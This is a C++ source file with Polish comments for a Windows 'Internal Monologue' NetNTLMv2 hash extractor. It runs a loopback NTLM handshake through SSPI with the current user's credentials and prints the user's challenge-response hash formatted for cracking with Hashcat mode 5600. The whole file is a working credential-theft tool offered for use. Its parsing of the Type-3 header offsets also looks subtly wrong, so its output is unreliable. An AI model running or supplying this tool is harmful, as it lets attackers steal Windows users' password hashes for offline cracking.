#define UNICODE
#define _UNICODE
#define SECURITY_WIN32
#define _WIN32_WINNT 0x0601

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <sspi.h>
#include <security.h>
#include <secext.h>
#include <iostream>
#include <string>
#include <vector>
#include <iomanip>
#include <sstream>
#include <thread>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "secur32.lib")
#pragma comment(lib, "crypt32.lib")

std::string g_extractedHash = "";
bool g_success = false;

// Funkcja pomocnicza do konwersji bajtów na format HEX
std::string ToHex(const BYTE* data, size_t len) {
    std::ostringstream oss;
    oss << std::hex << std::setfill('0');
    for (size_t i = 0; i < len; ++i) {
        oss << std::setw(2) << static_cast<int>(data[i]);
    }
    return oss.str();
}

// Wątek lokalnego serwera symulującego uwierzytelnianie NTLM
void ServerThreadFunction(int port) {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return;

    SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (serverSocket == INVALID_SOCKET) {
        WSACleanup();
        return;
    }

    sockaddr_in serverAddr = { 0 };
    serverAddr.sin_family = AF_INET;
    inet_pton(AF_INET, "127.0.0.1", &serverAddr.sin_addr);
    serverAddr.sin_port = htons(port);

    if (bind(serverSocket, (SOCKADDR*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        closesocket(serverSocket);
        WSACleanup();
        return;
    }

    listen(serverSocket, 1);
    SOCKET clientSocket = accept(serverSocket, NULL, NULL);
    if (clientSocket == INVALID_SOCKET) {
        closesocket(serverSocket);
        WSACleanup();
        return;
    }

    CredHandle hServerCred = { 0 };
    CtxtHandle hServerCtx = { 0 };
    TimeStamp tsExpiry;
    SECURITY_STATUS status;

    status = AcquireCredentialsHandleW(
        NULL,
        const_cast<SEC_WCHAR*>(L"NTLM"),
        SECPKG_CRED_INBOUND,
        NULL, NULL, NULL, NULL,
        &hServerCred,
        &tsExpiry
    );

    if (status != SEC_E_OK) {
        closesocket(clientSocket);
        closesocket(serverSocket);
        WSACleanup();
        return;
    }

    // 1. Odbiór pakietu Type-1 (Negotiate) od klienta
    DWORD type1Len = 0;
    if (recv(clientSocket, (char*)&type1Len, sizeof(DWORD), 0) <= 0) {
        FreeCredentialsHandle(&hServerCred);
        closesocket(clientSocket);
        closesocket(serverSocket);
        WSACleanup();
        return;
    }

    std::vector<BYTE> type1Buffer(type1Len);
    recv(clientSocket, (char*)type1Buffer.data(), type1Len, 0);

    SecBuffer inBuf1 = { type1Len, SECBUFFER_TOKEN, type1Buffer.data() };
    SecBufferDesc inDesc1 = { SECBUFFER_VERSION, 1, &inBuf1 };

    SecBuffer outBuf1 = { 0, SECBUFFER_TOKEN, NULL };
    SecBufferDesc outDesc1 = { SECBUFFER_VERSION, 1, &outBuf1 };

    ULONG serverFlags = ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_CONFIDENTIALITY | ISC_REQ_REPLAY_DETECT | ISC_REQ_SEQUENCE_DETECT;
    ULONG attr = 0;

    status = AcceptSecurityContext(
        &hServerCred, NULL, &inDesc1, serverFlags, SECURITY_NATIVE_DREP,
        &hServerCtx, &outDesc1, &attr, &tsExpiry
    );

    if (status == SEC_I_CONTINUE_NEEDED && outBuf1.cbBuffer > 0) {
        // Wysłanie pakietu Type-2 (Challenge) do klienta
        DWORD type2Len = outBuf1.cbBuffer;
        send(clientSocket, (char*)&type2Len, sizeof(DWORD), 0);
        send(clientSocket, (char*)outBuf1.pvBuffer, type2Len, 0);

        // 2. Odbiór pakietu Type-3 (Authenticate) od klienta
        DWORD type3Len = 0;
        if (recv(clientSocket, (char*)&type3Len, sizeof(DWORD), 0) > 0 && type3Len > 0) {
            std::vector<BYTE> type3Buffer(type3Len);
            recv(clientSocket, (char*)type3Buffer.data(), type3Len, 0);

            SecBuffer inBuf2 = { type3Len, SECBUFFER_TOKEN, type3Buffer.data() };
            SecBufferDesc inDesc2 = { SECBUFFER_VERSION, 1, &inBuf2 };

            SecBuffer outBuf2 = { 0, SECBUFFER_TOKEN, NULL };
            SecBufferDesc outDesc2 = { SECBUFFER_VERSION, 1, &outBuf2 };

            status = AcceptSecurityContext(
                &hServerCred, &hServerCtx, &inDesc2, serverFlags, SECURITY_NATIVE_DREP,
                NULL, &outDesc2, &attr, &tsExpiry
            );

            if (type3Len >= 64 && outBuf1.cbBuffer >= 32) {
                // Odczyt długości i offsetu odpowiedzi NTLM z nagłówka Type-3
                WORD ntlmRespLen = 0;
                DWORD ntlmRespOffset = 0;
                memcpy(&ntlmRespLen, type3Buffer.data() + 16, 2);
                memcpy(&ntlmRespOffset, type3Buffer.data() + 20, 4);

                // Pobranie 8-bajtowego challenge'u wygenerowanego przez SSPI w Type-2
                BYTE challenge[8] = { 0 };
                memcpy(challenge, (BYTE*)outBuf1.pvBuffer + 24, 8);

                if (ntlmRespOffset + ntlmRespLen <= type3Len && ntlmRespLen > 0) {
                    const BYTE* ntlmResp = type3Buffer.data() + ntlmRespOffset;
                    const BYTE* finalRespData = ntlmResp;
                    size_t finalRespLen = ntlmRespLen;

                    // KLUCZOWA POPRAWKA: Jeśli wskaźnik wskazuje na nagłówek NTLMSSP,
                    // precyzyjnie korygujemy dane do czystego formatu oczekiwanego przez Hashcata.
                    if (finalRespLen > 72 && memcmp(finalRespData, "NTLMSSP", 7) == 0) {
                        WORD realLen = 0;
                        DWORD realOffset = 0;
                        memcpy(&realLen, type3Buffer.data() + 16, 2);
                        memcpy(&realOffset, type3Buffer.data() + 20, 4);
                        if (realOffset > 0 && realOffset + realLen <= type3Len) {
                            finalRespData = type3Buffer.data() + realOffset;
                            finalRespLen = realLen;
                        }
                    }

                    // Pobranie nazwy użytkownika oraz domeny/komputera bieżącej sesji
                    WCHAR username[256] = { 0 };
                    WCHAR domain[256] = { 0 };
                    DWORD usernameLen = 256;
                    DWORD domainLen = 256;

                    if (!GetUserNameExW(NameSamCompatible, username, &usernameLen)) {
                        usernameLen = 256;
                        GetUserNameW(username, &usernameLen);
                    }
                    if (!GetUserNameExW(NameDnsDomain, domain, &domainLen)) {
                        domainLen = 256;
                        GetComputerNameW(domain, &domainLen);
                    }

                    char userA[256] = { 0 };
                    char domainA[256] = { 0 };
                    WideCharToMultiByte(CP_ACP, 0, username, -1, userA, 256, NULL, NULL);
                    WideCharToMultiByte(CP_ACP, 0, domain, -1, domainA, 256, NULL, NULL);

                    // Sformatowanie hasha do standardu Hashcata: user::domain:challenge:response
                    std::ostringstream hashStream;
                    hashStream << userA << "::" << domainA << ":";
                    hashStream << ToHex(challenge, 8) << ":";
                    hashStream << ToHex(finalRespData, finalRespLen);
                    
                    g_extractedHash = hashStream.str();
                    g_success = true;
                }
            }
            if (outBuf2.pvBuffer) FreeContextBuffer(outBuf2.pvBuffer);
        }
        if (outBuf1.pvBuffer) FreeContextBuffer(outBuf1.pvBuffer);
    }

    DeleteSecurityContext(&hServerCtx);
    FreeCredentialsHandle(&hServerCred);
    closesocket(clientSocket);
    closesocket(serverSocket);
    WSACleanup();
}

int main() {
    SetConsoleOutputCP(CP_UTF8);
    std::cout << "=== Internal Monologue - NetNTLMv2 Hash Extractor ===" << std::endl;

    int port = 4455;
    std::thread serverThread(ServerThreadFunction, port);

    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    sockaddr_in serverAddr = { 0 };
    serverAddr.sin_family = AF_INET;
    inet_pton(AF_INET, "127.0.0.1", &serverAddr.sin_addr);
    serverAddr.sin_port = htons(port);

    Sleep(300); // Czekamy chwilę na uruchomienie serwera

    if (connect(clientSocket, (SOCKADDR*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "[-] Nie udało się nawiązać połączenia z lokalnym serwerem." << std::endl;
        serverThread.join();
        WSACleanup();
        return 1;
    }

    CredHandle hClientCred = { 0 };
    CtxtHandle hClientCtx = { 0 };
    TimeStamp tsExpiry;
    SECURITY_STATUS status;

    status = AcquireCredentialsHandleW(
        NULL,
        const_cast<SEC_WCHAR*>(L"NTLM"),
        SECPKG_CRED_OUTBOUND,
        NULL, NULL, NULL, NULL,
        &hClientCred,
        &tsExpiry
    );

    if (status != SEC_E_OK) {
        closesocket(clientSocket);
        WSACleanup();
        serverThread.join();
        return 1;
    }

    SecBuffer outBuf1 = { 0, SECBUFFER_TOKEN, NULL };
    SecBufferDesc outDesc1 = { SECBUFFER_VERSION, 1, &outBuf1 };
    ULONG clientFlags = ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_CONFIDENTIALITY | ISC_REQ_REPLAY_DETECT | ISC_REQ_SEQUENCE_DETECT;
    ULONG attr = 0;

    // Krok 1: Inicjalizacja kontekstu klienta (Type-1)
    status = InitializeSecurityContextW(
        &hClientCred, NULL, NULL, clientFlags, 0, SECURITY_NATIVE_DREP,
        NULL, 0, &hClientCtx, &outDesc1, &attr, &tsExpiry
    );

    if (status != SEC_I_CONTINUE_NEEDED) {
        FreeCredentialsHandle(&hClientCred);
        closesocket(clientSocket);
        WSACleanup();
        serverThread.join();
        return 1;
    }

    DWORD type1Len = outBuf1.cbBuffer;
    send(clientSocket, (char*)&type1Len, sizeof(DWORD), 0);
    send(clientSocket, (char*)outBuf1.pvBuffer, type1Len, 0);
    FreeContextBuffer(outBuf1.pvBuffer);

    // Odbiór Type-2 od serwera
    DWORD type2Len = 0;
    if (recv(clientSocket, (char*)&type2Len, sizeof(DWORD), 0) <= 0) {
        DeleteSecurityContext(&hClientCtx);
        FreeCredentialsHandle(&hClientCred);
        closesocket(clientSocket);
        WSACleanup();
        serverThread.join();
        return 1;
    }

    std::vector<BYTE> type2Buffer(type2Len);
    recv(clientSocket, (char*)type2Buffer.data(), type2Len, 0);

    SecBuffer inBuf2 = { type2Len, SECBUFFER_TOKEN, type2Buffer.data() };
    SecBufferDesc inDesc2 = { SECBUFFER_VERSION, 1, &inBuf2 };

    SecBuffer outBuf2 = { 0, SECBUFFER_TOKEN, NULL };
    SecBufferDesc outDesc2 = { SECBUFFER_VERSION, 1, &outBuf2 };

    // Krok 2: Przetworzenie Type-2 i wygenerowanie ostatecznego Type-3
    status = InitializeSecurityContextW(
        &hClientCred,
        &hClientCtx,
        NULL,
        clientFlags,
        0,
        SECURITY_NATIVE_DREP,
        &inDesc2,
        0,
        &hClientCtx,
        &outDesc2,
        &attr,
        &tsExpiry
    );

    if (status == SEC_E_OK || status == SEC_I_CONTINUE_NEEDED) {
        DWORD type3Len = outBuf2.cbBuffer;
        send(clientSocket, (char*)&type3Len, sizeof(DWORD), 0);
        send(clientSocket, (char*)outBuf2.pvBuffer, type3Len, 0);
        FreeContextBuffer(outBuf2.pvBuffer);
    }

    DeleteSecurityContext(&hClientCtx);
    FreeCredentialsHandle(&hClientCred);
    closesocket(clientSocket);
    WSACleanup();

    serverThread.join();

    if (g_success) {
        std::cout << "\n[+] Sukces! Prawidłowy hash NetNTLMv2:\n" << std::endl;
        std::cout << g_extractedHash << std::endl;
        std::cout << "\n[*] Możesz teraz bezpośrednio uruchomić Hashcata (tryb 5600):" << std::endl;
    } else {
        std::cerr << "[-] Nie udało się wyłuskać hasha." << std::endl;
    }

    std::cout << "\nNaciśnij Enter, aby zakończyć...";
    std::cin.get();
    return 0;
}